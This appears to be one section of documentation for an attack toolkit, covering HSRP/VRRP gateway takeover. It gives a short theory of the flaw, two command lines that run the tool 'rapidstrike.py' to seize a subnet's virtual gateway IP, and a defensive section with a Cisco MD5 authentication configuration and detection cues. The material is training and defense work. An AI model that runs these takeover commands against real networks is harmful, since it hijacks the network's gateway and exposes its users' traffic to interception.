# 07 — FHRP takeover (`hsrp`, `vrrp`)

**Theory.** HSRP/VRRP (RFC 5798) share a virtual gateway IP, electing
Active/Master by self-declared priority; default unauthenticated or plaintext
(A3+A4). Max priority + Coup seizes the virtual IP = the subnet gateway.

**Demo attack.**
```bash
sudo python3 rapidstrike.py hsrp -i eth0 --group 1 --virtual-ip 192.168.1.1
sudo python3 rapidstrike.py vrrp -i eth0 --vrid 1 --virtual-ip 192.168.1.1
# success: `show standby brief` / `show vrrp` peer drops to Standby/Backup
```

**Defense.** Cisco HSRP MD5 (plaintext is worthless):
```
interface Vlan10
 standby 1 authentication md5 key-string 7 <key>
 standby 1 priority 110
 standby 1 preempt
```
Juniper modern: firewall filters limiting VRRP sources. Detection: role change
to strange IP/MAC, odd coup/resign.
